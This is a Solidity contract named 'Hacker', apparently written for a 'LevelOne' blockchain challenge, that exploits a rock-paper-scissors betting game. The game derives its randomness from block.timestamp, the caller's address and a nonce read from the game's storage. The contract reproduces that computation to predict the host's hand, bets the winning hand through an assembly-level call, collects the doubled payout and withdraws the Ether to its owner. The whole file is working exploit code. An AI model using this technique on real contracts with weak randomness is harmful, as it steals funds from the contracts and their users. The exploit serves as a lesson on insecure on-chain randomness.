// SPDX-License-Identifier: MIT
pragma solidity >=0.8.5 <0.9.0;

import "./LevelOne.sol";

contract Hacker {
  address payable public hacker;

  modifier onlyHacker {
    require(msg.sender == hacker, "caller is not the hacker");
    _;
  }

  constructor() {
    hacker = payable(msg.sender);
  }

  /**
   * Attack the game contract.
   *
   * @param _target - The address of the game contract
   * @param _hostRandNonce - The randNonce of the game contract, front-end will read the game's storage and let hacker know the value. 🤪🤪🤪
   */
  function attack(address _target, uint256 _hostRandNonce) public payable onlyHacker {
    // Simulate the host's hand. 😝😝😝
    LevelOne.Hand hostHand = getHostHand(_hostRandNonce);
    // Guess the winning hand depends on host's one.
    LevelOne.Hand hackerHand = LevelOne.Hand((uint8(hostHand) + 1) % 3);

    bytes memory sig = abi.encodeWithSignature("bet(uint8)", hackerHand);
    bool result = false;

    assembly {
      // Load the length (first 32 bytes)
      let len := mload(sig)
      // Skip over the length field.
      let data := add(sig, 0x20)
      result := call(
        gas(), // gas
        _target, // target address
        callvalue(), // ether
        data, // input location
        len, // length of input params
        0, // output location
        0 // no need to use output params
      )
    }

    require(result, "Hacker: Failed!");
  }

  /**
   * @dev Hacker simulates game's hand.
   * @param _randNonce - The host's current randNonce, provided through front-end
   *
   * Get the host's hand based on random number.
   *
   * @return a different hand every time called.
   */
  function getHostHand(uint256 _randNonce) internal view returns (LevelOne.Hand) {
    uint256 rand = randMod(90, _randNonce);
    if (rand < 30) {
      return LevelOne.Hand.rock;
    } else if (rand < 60) {
      return LevelOne.Hand.paper;
    }
    return LevelOne.Hand.scissors;
  }

  /**
   * @dev Hacker simulates game's random function.
   * @dev block.timestamp is the same as host gets.
   * @dev Replace msg.sender with the current address.
   * @param _randNonce - The host's current randNonce, provided through front-end
   *
   * Generate random number between 0 to _modulus.
   * Not secure! 😞
   *
   * @param _modulus - The max - 1 of the random number range
   */
  function randMod(uint256 _modulus, uint256 _randNonce) internal view returns (uint256) {
    return uint256(keccak256(abi.encodePacked(block.timestamp, address(this), _randNonce + 1))) % _modulus;
  }

  /**
   * Receive Ether.
   * If hacker won, the game contract will send back twice of our bet.
   */
  receive() external payable {}

  /**
   * Withdraw Ether to owner, the only way to take back Ether for hacker.
   * @dev you can transfer inside receive function, because insufficient gas to process, as the host use transfer to return Ether.
   */
  function withdraw() external onlyHacker {
    hacker.transfer(address(this).balance);
  }
}
